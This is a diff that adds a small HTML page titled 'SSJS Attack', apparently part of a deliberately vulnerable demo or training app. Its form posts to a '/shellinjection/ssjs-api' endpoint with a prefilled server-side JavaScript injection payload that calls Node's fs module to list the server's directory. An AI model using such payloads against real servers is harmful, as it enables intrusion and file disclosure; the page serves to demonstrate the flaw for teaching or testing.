@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>SSJS Attack</title>
+    <link rel='stylesheet' href='/stylesheets/style.css' />
+    <script>
+    </script>
+  </head>
+  <body>
+    <h1>SSJS </h1>
+    <form id="myForm" method="POST" action="/shellinjection/ssjs-api">
+    <input length="300" value="res.end(require('fs').readdirSync('.').toString())" name="year" id="year" />
+    <button type="submit">Submit</button>
+    </form>
+
+  </body>
+</html>
